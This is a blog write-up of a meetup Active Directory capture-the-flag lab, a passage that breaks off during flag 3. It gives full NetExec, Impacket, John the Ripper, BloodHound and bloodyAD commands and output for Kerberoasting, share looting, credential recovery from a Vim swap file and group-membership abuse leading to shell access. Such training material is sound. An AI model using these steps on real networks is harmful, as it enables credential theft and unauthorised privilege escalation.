---
date: 2025-09-07
layout: page
authors:
  - name: "Zavier Lee"
    avatar: "./assets/img/authors/zavier.png"
    title: "Offensive Security Engineer"
    twitter: "https://x.com/gatariee"
    github: "https://github.com/gatariee"
---

# Range Village CTF, September 2025

Last weekend, we sponsored an Active Directory lab that was showcased during the [September Range Village Meetup](https://www.meetup.com/div0_sg/events/310625377/), hosted by [Division Zero (Div0)](https://www.div0.sg/) and the [Range Village crew](https://www.linkedin.com/company/the-range-village/). The event was a great success, with close to 40 participants joining us for an evening of learning and fun!

This blog post provides an overview of the lab, including the challenges, statistics, and solutions for each flag. There are multiple solutions for some of the flags, so if you have done the lab - do look out for the alternative methods covered in this post!

<div class="toc-container">
  <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
  <div class="toc-content" id="tocContent">
    <ol>
      <li>
        <a href="#range-village-ctf-september-2025">Range Village CTF, September 2025</a>
        <ul>
          <li><a href="#challenge-overview">Challenge Overview</a></li>
          <li><a href="#solve-statistics">Solve Statistics</a></li>
        </ul>
      </li>
      <li>
        <a href="#flag-1-and-so-it-begins">And, so it begins...</a>
        <ul>
            <li><a href="#path-1-kerberoasting">Kerberoasting</a></li>
                <ul>
                    <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
                    <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
                </ul>
            <li><a href="#path-2-cross-forest-enumeration">Cross-Forest Enumeration</a></li>
            <li><a href="#looting-shares">Looting Shares</a></li>
        </ul>
      </li>
      <li>
        <a href="#flag-2-access-uncontrolled">Access (Un)controlled</a>
            <ul>
                <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
                <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
                <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
            </ul>
      </li>
    </ol>
  </div>
</div>

## Challenge Overview

The lab was designed to simulate a real-world Active Directory environment, while also being beginner-friendly. There were a total of 8 flags, across 4 machines and 2 domains, with a mix of easy and challenging flags to cater to participants of all skill levels. The lab was structured to encourage collaboration and teamwork, with participants working together to solve the challenges and capture the flags.

![challenges](./assets/img/rv-sept/challenges.png)

The lab featured 2 domains: `antennae.rv` and `backward.rv` - and 4 machines: `dc01.antennae.rv`, `sql01.antennae.rv`, `dc02.backward.rv` and `srv01.backward.rv`. The following credentials were provided to all participants at the start of the event to simulate an [assumed breach scenario](https://trustedsec.com/blog/assumed-breach-the-evolution-of-offensive-security-testing):

```
User: chloe.lim@antennae.rv
Password: BZCJsopuOPgH
```

## Solve Statistics

A total of 26 participants captured at least one flag, with only one person successfully completing the entire lab by capturing all 8 flags. The `Silver` challenge proved to be the most difficult, showing a sharp decline in solves - from 12 for the `Historical Scar` challenge down to just 4 for `Silver`.

![stats](./assets/img/rv-sept/solves.png)

Overall, the lab was a great success, with participants enjoying the challenges and learning new skills. The feedback received was overwhelmingly positive, with many participants expressing their appreciation for the opportunity to learn and collaborate in a supportive environment. We would like to extend our gratitude to [Div0](https://www.div0.sg/) and [Range Village](https://www.linkedin.com/company/the-range-village/) for hosting the event, and we look forward to sponsoring more events in the future!

# Flag 1: And, so it begins...

![](./assets/img/rv-sept/1.png)

## Path 1: Kerberoasting

Using the given credentials for `chloe.lim@antennae.rv`, we can start by enumerating the `antennae.rv` domain and identifying users with [Service Principal Names (SPNs)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) set.

We can achieve this using an `LDAP` query with [NetExec's](https://www.netexec.wiki/ldap-protocol/query-ldap) `LDAP` flag, we'll find a couple of users with SPNs set:

```
~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(&(objectClass=user)(servicePrincipalName=*))" "samAccountName servicePrincipalName"

LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 

LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_vdi,CN=Users,DC=antennae,DC=rv
LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_vdi
LDAP        10.5.10.10      389    DC01             servicePrincipalName HORIZON/VirtualDesktop
LDAP        10.5.10.10      389    DC01                                  TERMSRV/vdi.antennae.rv
LDAP        10.5.10.10      389    DC01                                  HTTPS/vdi.antennae.rv
LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi
LDAP        10.5.10.10      389    DC01                                  HORIZON/vdi.antennae.rv
LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=svc_sql,CN=Users,DC=antennae,DC=rv
LDAP        10.5.10.10      389    DC01             sAMAccountName       svc_sql
LDAP        10.5.10.10      389    DC01             servicePrincipalName MSSQLSvc/sql01.antennae.rv:1433
LDAP        10.5.10.10      389    DC01                                  MSSQLSvc/sql01.antennae.rv
```

The `servicePrincipalName` format generally follows the pattern of `service/hostname:port` or `service/hostname`, indicating the service type and the host it is associated with. In this case, we have two users with SPNs set: `svc_vdi` and `svc_sql`. Based on the SPNs, we can infer that `svc_vdi` is likely associated with a [Virtual Desktop Infrastructure (VDI)](https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-virtual-desktop-infrastructure-vdi) service running on `vdi.antennae.rv`, while `svc_sql` is associated with a [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) service running on `sql01.antennae.rv` on the default SQL port `1433`.

We can perform a [Kerberoasting](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/) attack on either of these users to obtain an encrypted service ticket for their respective services. These tickets will be encrypted with the service account's password, which we can then attempt to crack offline.

> Kerberoasting is not inherently malicious, requesting service tickets for services is an integral part of Kerberos. This technique only becomes lucrative when the service account is using a weak password.

### Roasting (The Easy Way)

We can request service tickets for both users using [NetExec](https://www.netexec.wiki/ldap-protocol/kerberoasting), and write the output to a file called `service_tickets.txt`:

```
~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --kerberoasting service_tickets.txt                                                           
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
LDAP        10.5.10.10      389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.5.10.10      389    DC01             [*] Total of records returned 2
LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_vdi, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:57.992825, lastLogon: 2025-08-28 15:17:30.758637
LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_vdi$ANTENNAE.RV$antennae.rv\svc_vdi*$1b38c1a87120eefcd7717394fbb96d[....snip...]dc5aa8d0085bbebc39e64c248495570f61b5e1a157
LDAP        10.5.10.10      389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=Service Accounts,CN=Users,DC=antennae,DC=rv, pwdLastSet: 2025-08-28 15:16:58.149076, lastLogon: 2025-08-30 07:37:42.373093
LDAP        10.5.10.10      389    DC01             $krb5tgs$23$*svc_sql$ANTENNAE.RV$antennae.rv\svc_sql*$a66fad26fc10f1372475[...snip...]0eace690f78af8994cc2d7338f0bbc79ee152ab5cb6
```

Next, we can attempt to crack these service tickets using [John the Ripper](https://www.openwall.com/john/) with the [rockyou.txt](https://weakpass.com/wordlists/rockyou.txt) wordlist. 

```
~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tr4v15           (?)     
```

We get a hit on one of the service tickets, after trying the password for both `svc_vdi` and `svc_sql`, we find that the cracked password `tr4v15` belongs to the `svc_vdi` account.

```
~$ nxc ldap dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15'                                            
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\svc_vdi:tr4v15
```

### Roasting (The Hard Way)

We can explicitly request a service ticket for `TERMSRV/vdi.antennae.rv` using `kinit` and `kvno`, which are part of the [Kerberos](https://web.mit.edu/kerberos/) suite of tools. Firstly, we need to grab a `Ticket Granting Ticket (TGT)` for `chloe.lim` using `kinit`:

```
~$ echo 'BZCJsopuOPgH' | kinit 'chloe.lim'@ANTENNAE.RV
Password for chloe.lim@ANTENNAE.RV: 

~$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: chloe.lim@ANTENNAE.RV

Valid starting       Expires              Service principal
09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
        renew until 09/08/2025 08:45:27
```

We can then use `kvno` to request a service ticket for `TERMSRV/vdi.antennae.rv`, which will be added to our existing ticket cache:

```
~$ kvno TERMSRV/vdi.antennae.rv
TERMSRV/vdi.antennae.rv@ANTENNAE.RV: kvno = 2

~$ klist                       
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: chloe.lim@ANTENNAE.RV

Valid starting       Expires              Service principal
09/07/2025 08:45:27  09/07/2025 18:45:27  krbtgt/ANTENNAE.RV@ANTENNAE.RV
        renew until 09/08/2025 08:45:27
09/07/2025 08:46:21  09/07/2025 18:45:27  TERMSRV/vdi.antennae.rv@ANTENNAE.RV
        renew until 09/08/2025 08:45:27
```

In order to extract the service ticket from our ticket cache, we can use `describeTicket.py` from the [Impacket](https://github.com/fortra/impacket) toolkit which exposes the `kerberoast_from_ccache` functionality:

```python
# https://github.com/fortra/impacket/blob/master/examples/describeTicket.py#L684
def kerberoast_from_ccache(decodedTGS, spn, username, domain):
    ...
    if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
    entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
        constants.EncryptionTypes.rc4_hmac.value, username, domain, spn.replace(':', '~'),
        hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
        hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
```

In this case, the `enc-part->cipher` field contains the service ticket which is encrypted with the service account's password. We can run `describeTicket.py` and pipe the output to `john` for cracking.

> If you want to learn more about how Kerberos works, check out our [public preview](https://github.com/ASYNC-Security/W200-Preview-Public?tab=readme-ov-file#kerberoasting) of our W200 course.

```
~$ describeTicket.py /tmp/krb5cc_1000
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 2
[*] Parsing credential[0]:
[*] Ticket Session Key            : c6a42e5645c02296b49b5e3b26610ce07537f383ba7e26066d28c4f8af03e7f3
[*] User Name                     : chloe.lim
[*] User Realm                    : ANTENNAE.RV
[*] Service Name                  : krbtgt/ANTENNAE.RV
[*] Service Realm                 : ANTENNAE.RV
[*] Start Time                    : 07/09/2025 08:45:27 AM
[*] End Time                      : 07/09/2025 18:45:27 PM
[*] RenewTill                     : 08/09/2025 08:45:27 AM
[*] Flags                         : (0xe10000) renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : xqQuVkXAIpa0m147JmEM4HU384O6fiYGbSjE+K8D5/M=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/ANTENNAE.RV
[*]   Service Realm               : ANTENNAE.RV
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
[*] Parsing credential[0]:
[*] Ticket Session Key            : 9ee0acdda8247fecc421ed5751706835
[*] User Name                     : chloe.lim
[*] User Realm                    : ANTENNAE.RV
[*] Service Name                  : TERMSRV/vdi.antennae.rv
[*] Service Realm                 : ANTENNAE.RV
[*] Start Time                    : 07/09/2025 08:46:21 AM
[*] End Time                      : 07/09/2025 18:45:27 PM
[*] RenewTill                     : 08/09/2025 08:45:27 AM
[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : nuCs3agkf+zEIe1XUXBoNQ==
[*] Kerberoast hash               : $krb5tgs$23$*USER$ANTENNAE.RV$TERMSRV/vdi.antennae.rv*$f7a2c6216c08a17845806011049566b3$5[...snip...]0b6146b1e037b0fc3f81037ccc0260dd022ab44d39351b95027b1a57f400bb7f536a14a96e3e74e94ba
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : TERMSRV/vdi.antennae.rv
[*]   Service Realm               : ANTENNAE.RV
[*]   Encryption type             : rc4_hmac (etype 23)
[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
```

This "Kerberoast hash" can then be piped to `john`, like we did before, to crack the password.

```
~$ describeTicket.py /tmp/krb5cc_1000 | grep 'Kerberoast hash' | awk '{print $5}' | tee service_tickets.txt
~$ john --wordlist=/usr/share/wordlists/rockyou.txt service_tickets.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tr4v15           (?)     
1g 0:00:00:01 DONE (2025-09-07 08:55) 0.8474g/s 2630Kp/s 2630Kc/s 2630KC/s trabajadorasocial24..tr0ydawn
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> Some tools may attempt to _downgrade_ the encryption type of the service ticket to `rc4_hmac` which may be a point of detection. Using `kinit` and `kvno` ensures that the service ticket is requested with the service account's actual encryption type. See: [The Art of Detecting Kerberoast Attacaks](https://trustedsec.com/blog/art_of_kerberoast).

## Path 2: Cross-Forest Enumeration

Another way of obtaining the credentials for `svc_vdi` is through enumeration of the `backward.rv` domain, which has a [two-way trust relationship](https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust) with the `antennae.rv` domain.

We can identify this trust relationship by querying the `dc01.antennae.rv` domain controller for its trusted domains:

```
~$ nxc ldap dc01.antennae.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' --query "(objectClass=trustedDomain)" "cn flatName trustDirection trustType"
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
LDAP        10.5.10.10      389    DC01             [+] Response for object: CN=backward.rv,CN=System,DC=antennae,DC=rv
LDAP        10.5.10.10      389    DC01             cn                   backward.rv
LDAP        10.5.10.10      389    DC01             trustDirection       3
LDAP        10.5.10.10      389    DC01             trustType            2
LDAP        10.5.10.10      389    DC01             flatName             backward
```

The `trustDirection` attribute indicates the direction of the trust relationship:

- `1`: One-way incoming trust
- `2`: One-way outgoing trust
- `3`: Two-way trust

The presence of a `trustDirection` value of `3` confirms that there is a two-way trust relationship between the `antennae.rv` and `backward.rv` domains - this means that users from either domain can access resources in the other domain.

We can verify this by attempting to authenticate to the `backward.rv` domain controller `dc02.backward.rv` using the credentials for `chloe.lim@antennae.rv`

```
~$ nxc ldap dc02.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv'
LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:antennae.rv) (signing:None) (channel binding:Never) 
LDAP        10.5.10.12      389    DC02             [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
```

With this trust relationship in place, we can enumerate the `backward.rv` domain for open and accessible shares. We'll find that on the `srv01.backward.rv` machine, we have access to the `antennae.rv` and `Public` shares.

```
~$ nxc smb srv01.backward.rv -u 'chloe.lim' -p 'BZCJsopuOPgH' -d 'antennae.rv' --shares
SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
SMB         10.5.10.13      445    SRV01            [+] antennae.rv\chloe.lim:BZCJsopuOPgH 
SMB         10.5.10.13      445    SRV01            [*] Enumerated shares
SMB         10.5.10.13      445    SRV01            Share           Permissions     Remark
SMB         10.5.10.13      445    SRV01            -----           -----------     ------
SMB         10.5.10.13      445    SRV01            ADMIN$                          Remote Admin
SMB         10.5.10.13      445    SRV01            antennae.rv     READ            Shared folder for users in antennae.rv
SMB         10.5.10.13      445    SRV01            backward.rv                     Shared folder for users in backward.rv
SMB         10.5.10.13      445    SRV01            C$                              Default share
SMB         10.5.10.13      445    SRV01            IPC$            READ            Remote IPC
SMB         10.5.10.13      445    SRV01            Public          READ,WRITE      Shared folder for users in both antennae.rv and backward.rv
```

We can loot the `Public` share, and find a file called `note.txt` that contains the credentials for the `svc_vdi` account:

```
~$ smbclient.py 'chloe.lim':'BZCJsopuOPgH'@srv01.backward.rv                           
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Public
# ls
drw-rw-rw-          0  Sun Sep  7 09:03:04 2025 .
drw-rw-rw-          0  Sat Aug 30 04:36:43 2025 ..
-rw-rw-rw-          0  Sat Aug 30 04:36:19 2025 .empty
-rw-rw-rw-        181  Sat Aug 30 04:36:19 2025 note.txt
-rw-rw-rw-         21  Sat Aug 30 04:36:19 2025 README.md
# cat note.txt
@Jolene, here are the creds for svc_vdi as you asked for earlier.

Not sure why you need them anymore cuz our VDI project got canned last week, but whatever.

svc_vdi
tr4v15
```

## Looting Shares

After obtaining access to `svc_vdi`, we can use these credentials to re-enumerate shares on `dc01.antennae.rv` to look for any interesting files. We'll find that we have read access to the `service-home` share.

```
~$ nxc smb dc01.antennae.rv -u 'svc_vdi' -p 'tr4v15' --shares
SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.5.10.10      445    DC01             [+] antennae.rv\svc_vdi:tr4v15 
SMB         10.5.10.10      445    DC01             [*] Enumerated shares
SMB         10.5.10.10      445    DC01             Share           Permissions     Remark
SMB         10.5.10.10      445    DC01             -----           -----------     ------
SMB         10.5.10.10      445    DC01             ADMIN$                          Remote Admin
SMB         10.5.10.10      445    DC01             C$                              Default share
SMB         10.5.10.10      445    DC01             IPC$            READ            Remote IPC
SMB         10.5.10.10      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.5.10.10      445    DC01             service-home    READ            Shared folder for services provisioned in antennae.rv
SMB         10.5.10.10      445    DC01             SYSVOL          READ            Logon server share 
```

In this share, we'll find `flag1.txt` which contains the first flag:

```
~$ smbclient.py 'svc_vdi':'tr4v15'@dc01.antennae.rv         
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

uType help for list of commands
# use service-home
# ls
drw-rw-rw-          0  Sat Aug 30 08:15:51 2025 .
drw-rw-rw-          0  Sat Aug 30 04:36:57 2025 ..
-rw-rw-rw-         78  Sat Aug 30 04:37:04 2025 .env.sample.horizon
-rw-rw-rw-      12289  Sat Aug 30 04:37:04 2025 .env.swp
-rw-rw-rw-       1284  Sat Aug 30 04:37:04 2025 Connect-Horizon.ps1
-rw-rw-rw-        925  Sat Aug 30 04:37:04 2025 Deploy-DesktopPool.ps1
-rw-rw-rw-         62  Sat Aug 30 08:15:51 2025 flag1.txt
# cat flag1.txt
RV{roAStIn6_1IkE_n0_7OMOrroW_e8cac89a3efd99b6c843857ac8faa276}
# 
```

# Flag 2: Access (Un)controlled

![](./assets/img/rv-sept/2.png)

Based on the description of the challenge, we'll know that the next flag requires us to obtain local access to the `sql01.antennae.rv` machine. This need not be administrative access, as it is mentioned that the flag can be read by all local users.

In the `service-home` share, we find a `.env.swp` file, which is a [Vim swap file](https://vi.stackexchange.com/questions/177/what-is-the-purpose-of-swap-files). A quick google search reveals that: `Swap files store changes you've made to the buffer. If Vim or your computer crashes, they allow you to recover those changes.`. You may also find that after opening a file in `vim`, a `.<filename>.swp` file is created in the same directory.

We can "recover" the contents of this swap file using the `vim -r` command, and find that it contains credentials for the `jolene.ong` user.

```
~$ vim -r .env.swp
:w .env.swp.recv

~$ cat .env.swp.recv      
HORIZON_SERVER=broker.antennae.rv
HORIZON_USER=jolene.ong
HORIZON_PASS=BoXALrqvqPd3
```

We can verify that these credentials are valid by attempting to authenticate to the `antennae.rv` domain controller `dc01.antennae.rv`:

```
~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3'                                                                            
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
```

At this point, we can run a [bloodhound](https://github.com/SpecterOps/BloodHound) collector to begin mapping out the Active Directory environment. We can use 
[bloodhound-ce-python](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce) for this.

> Note that this could have been done earlier as well, but was not necessary for capturing the first flag.

```
~$ bloodhound-ce-python -u 'jolene.ong' -p 'BoXALrqvqPd3' -d 'antennae.rv' -c 'All' -ns '10.5.10.10' --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: antennae.rv
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.antennae.rv
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.antennae.rv
INFO: Found 22 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SQL01.antennae.rv
INFO: Querying computer: DC01.antennae.rv
INFO: Done in 00M 04S
INFO: Compressing output into 20250907091433_bloodhound.zip
```

Following the [BloodHound Documentation](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart), we can ingest the resulting `zip` file into `BloodHound` and begin analyzing the data.

![](./assets/img/rv-sept/bhce.png)


Using `BloodHound`'s path-finding feature, we can identify that `jolene.ong` is a member of the `Development` group which has some [`Access Control Entries (ACEs)`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/ace) on the `senior-developers` and `intern-developers` group.

## Identifying Privileged Groups

We can take the "easy" route and simply abuse both of these ACEs and add ourselves to both groups, which will ultimately lead us in the right direction. However, you may want to take a more methodical approach and identify which of these groups is more "privileged".

Firstly, we can use `jolene.ong`'s credentials to re-enumerate the open shares in `sql01.antennae.rv`, and find that we have read access to the `Tools` share.

```
~$ nxc smb sql01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' --shares
SMB         10.5.10.11      445    SQL01            [*] Windows Server 2022 Build 20348 x64 (name:SQL01) (domain:antennae.rv) (signing:True) (SMBv1:False)
SMB         10.5.10.11      445    SQL01            [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
SMB         10.5.10.11      445    SQL01            [*] Enumerated shares
SMB         10.5.10.11      445    SQL01            Share           Permissions     Remark
SMB         10.5.10.11      445    SQL01            -----           -----------     ------
SMB         10.5.10.11      445    SQL01            ADMIN$                          Remote Admin
SMB         10.5.10.11      445    SQL01            C$                              Default share
SMB         10.5.10.11      445    SQL01            IPC$            READ            Remote IPC
SMB         10.5.10.11      445    SQL01            Tools           READ            Shared folder for tools
```

Inside the `Tools` share, we find a file called `test-connection.ps1` which contains a script that attempts to connect to the `SSH` service on `sql01.antennae.rv`:

```
~$ smbclient.py 'jolene.ong':'BoXALrqvqPd3'@sql01.antennae.rv
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use tools
# ls
drw-rw-rw-          0  Sat Aug 30 04:37:19 2025 .
drw-rw-rw-          0  Sat Aug 30 04:37:13 2025 ..
-rw-rw-rw-        854  Sat Aug 30 04:37:19 2025 test-connection.ps1
# cat test-connection.ps1
Import-Module Posh-SSH

$user = 'danish.hakim'
$host = 'sql01.antennae.rv'
$port = 22

$securePass = Read-Host "Enter SSH password for $user@$host" -AsSecureString

$creds = New-Object System.Management.Automation.PSCredential($user, $securePass)

try {
    $session = New-SSHSession `
        -ComputerName $host `
        -Port $port `
        -Credential $creds `
        -AcceptKey:$true

    if ($session -and $session.SessionId) {
        $result = Invoke-SSHCommand -SessionId $session.SessionId -Command 'hostname'
        $result.Output.Trim()

        Remove-SSHSession -SessionId $session.SessionId | Out-Null
        Write-Host "goodbye" -ForegroundColor Green
    }
    else {
        Write-Host "err: failed to establish SSH session." -ForegroundColor Red
    }
}
catch {
    Write-Host "err: $($_.Exception.Message)" -ForegroundColor Red
}
# 
```

In the script, we see that the `danish.hakim` user seems to be the intended user for connecting to the `SSH` service. On `BloodHound`, we'll find that the `danish.hakim` user is a member of the `senior-developers` group.

![](./assets/img/rv-sept/dhkm.png)

Based on this, we can reasonably conclude that the `senior-developers` group _may_ have `SSH` access to `sql01.antennae.rv`.

## MachineAccountQuota

The `GenericAll` privilege that `jolene.ong` has on the `senior-developers` group allows her to add herself to that group, but this may be disruptive and not an attack that you want to perform in a real-world scenario without proper authorization. Instead, we can use the [`MachineAccountQuota`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/default-workstation-numbers-join-domain) to create a new computer account in the `antennae.rv` domain, and then add that computer account to the `senior-developers` group.

The `MachineAccountQuota` value can be enumerated using the `maq` module from `nxc`:

```
~$ nxc ldap dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M maq                                              
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
MAQ         10.5.10.10      389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.5.10.10      389    DC01             MachineAccountQuota: 10
```

The default value for `MachineAccountQuota` is `10`, which means that any authenticated user can create up to `10` computer accounts in the domain. We can use the `nxc` tool to create a new computer account called `gatari$`:

```
~$ nxc smb dc01.antennae.rv -u 'jolene.ong' -p 'BoXALrqvqPd3' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd'
SMB         10.5.10.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:antennae.rv) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.5.10.10      445    DC01             [+] antennae.rv\jolene.ong:BoXALrqvqPd3 
ADD-COMP... 10.5.10.10      445    DC01             Successfully added the machine account: "gatari$" with Password: "P@ssw0rd"
```

## Abusing GenericAll on Group

This new computer account can then be used to authenticate to the `antennae.rv` domain controller `dc01.antennae.rv`:

```
~$ nxc ldap dc01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'                                                           
LDAP        10.5.10.10      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:antennae.rv) (signing:None) (channel binding:No TLS cert) 
LDAP        10.5.10.10      389    DC01             [+] antennae.rv\gatari$:P@ssw0rd 
```

With this computer account added, we can now use `jolene.ong` to add `gatari$` to the `senior-developers` group. The [bloodyAD](https://github.com/CravateRouge/bloodyAD) tool can be used for this purpose:

```
~$ bloodyAD --host 'dc01.antennae.rv' -u 'jolene.ong' -p 'BoXALrqvqPd3' add groupMember 'senior-developers' 'gatari$'
[+] gatari$ added to senior-developers
```

With this done, we can now authenticate to the `SSH` service on `sql01.antennae.rv` using the `gatari$` computer account:

```
~$ nxc ssh sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
SSH         10.5.10.11      22     sql01.antennae.rv [*] SSH-2.0-OpenSSH_for_Windows_9.8 Win32-OpenSSH-GitHub
SSH         10.5.10.11      22     sql01.antennae.rv [+] gatari$:P@ssw0rd  Windows - Shell access!
```

Do note that `WinRM` or `RDP` could have also been used instead of `SSH`:

```
~$ nxc winrm sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'
WINRM       10.5.10.11      5985   SQL01            [*] Windows Server 2022 Build 20348 (name:SQL01) (domain:antennae.rv) 
WINRM       10.5.10.11      5985   SQL01            [+] antennae.rv\gatari$:P@ssw0rd (Pwn3d!)

~$ nxc rdp sql01.antennae.rv -u 'gatari$' -p 'P@ssw0rd'  
RDP         10.5.10.11      3389   SQL01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SQL01) (domain:antennae.rv) (nla:True)
RDP         10.5.10.11      3389   SQL01            [+] antennae.rv\gatari$:P@ssw0rd 
```

We can now connect to the `sql01.antennae.rv` machine and read the `flag2.txt` file:

```
~$ sshpass -p 'P@ssw0rd' ssh 'gatari$'@sql01.antennae.rv

PS C:\> cat flag2.txt
RV{d@ngER0US_4cc3$S_C0n7Rol_1!sts!_6daa59eff6fd00657e9fb802c0078a4c}
```

# Flag 3: Moving Laterally

![](./assets/img/rv-sept/3.png)

After obtaining local access to `sql01.antennae.rv`, we can begin enumerating the machine for any interesting files or credentials. After some searching (or running `tree /f /a`), we'll find a file at `C:\Users\Public\test.ps1` that contains credentials for `wei.jie.tan`:

```
PS C:\Users> cat C:\Users\Public\test.ps1
$username = 'wei.jie.tan'
$password = 'klDCzcAiLGc2'
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($username, $securePass)
$scriptBlock = {
